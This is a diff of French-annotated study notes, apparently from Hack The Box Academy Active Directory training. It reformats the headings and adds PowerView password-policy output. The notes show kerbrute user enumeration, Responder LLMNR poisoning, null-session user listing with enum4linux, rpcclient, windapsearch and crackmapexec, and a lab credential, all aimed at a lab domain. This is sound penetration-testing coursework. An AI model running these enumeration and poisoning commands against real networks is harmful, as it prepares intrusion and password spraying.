@@ -6,10 +6,9 @@
    - [Initial Enumeration of the Domain](#initial-enumeration-of-the-domain)
 2. [Sniffing out a Foothold](#sniffing-out-a-foothold)
    - [LLMNR/NBT-NS Poisoning from Linux](#llmnr/nbt-ns-poisoning-from-linux)
-3. Sighting In, Hunting For A User
-   - Password Spraying Overview
-   - Enumerating & Retrieving Password Policies
-   - Password Spraying - Making a Target User List
+3. [Sighting In, Hunting For A User](#)
+   - [Enumerating & Retrieving Password Policies](#)
+   - [Password Spraying - Making a Target User List](#)
 4. Spray Responsibly
    - Internal Password Spraying from Linux
    - Internal Password Spraying from Windows
@@ -125,7 +124,8 @@ keylian zergainoh@htb[/htb]$ fping -asgq 172.16.5.0/23
 
 Déplace l’exécutable kerbrute vers le répertoire /usr/local/bin pour le rendre accessible globalement.
 Utilise kerbrute pour énumérer les utilisateurs dans le domaine INLANEFREIGHT.LOCAL en utilisant le contrôleur de domaine 172.16.5.5 et enregistre les utilisateurs valides dans le fichier valid_ad_users.
-```
+
+```bash
 sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
 kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
 
@@ -149,7 +149,7 @@ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_
 ```
 
 ### LLMNR/NBT-NS Poisoning from Linux
-```
+```bash
 ifconfig                                                                                                                                                            
 docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
         inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
@@ -265,31 +265,34 @@ sudo responder -I ens224
 ........................................
 
 ```
-### Enumerating the Password Policy - from Linux - Credentialed
+## Sighting In, Hunting For A User
 
+
+
+### Enumerating & Retrieving Password Policies
 
  Utilise enum4linux pour énumérer les utilisateurs sur l’hôte 172.16.5.5 et filtre les résultats pour afficher uniquement les noms d’utilisateur.
-```
+```bash
 enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
 
 ```
 
 
 Utilise rpcclient pour se connecter à l’hôte 172.16.5.5 sans authentification.
-```
+```bash
 rpcclient -U "" -N 172.16.5.5
 
 ```
 
 
  Utilise crackmapexec pour énumérer les utilisateurs SMB sur l’hôte 172.16.5.5.
-```
+```bash
 crackmapexec smb 172.16.5.5 --users
 ```
 
 
 Utilise windapsearch pour interroger le contrôleur de domaine à l’adresse IP 172.16.5.5 sans authentification et énumérer les utilisateurs.
-```
+```bash
 ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
 ```
 
@@ -310,7 +313,26 @@ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 ```
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
 ```
-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+Utilisation de PowerView
+
+```powershell
+PS C:\htb> import-module .\PowerView.ps1
+PS C:\htb> Get-DomainPolicy
+
+Unicode        : @{Unicode=yes}
+SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
+                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
+                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
+                 LSAAnonymousNameLookup=0}
+KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
+Version        : @{signature="$CHICAGO$"; Revision=1}
+RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
+Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
+                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
+GPODisplayName : Default Domain Policy
+
+```
 
 Utilise kerbrute pour énumérer les utilisateurs dans le domaine INLANEFREIGHT en utilisant le contrôleur de domaine INLANEFREIGHT.LOCAL et le fichier de noms d’utilisateur jsmith.txt.
 ```
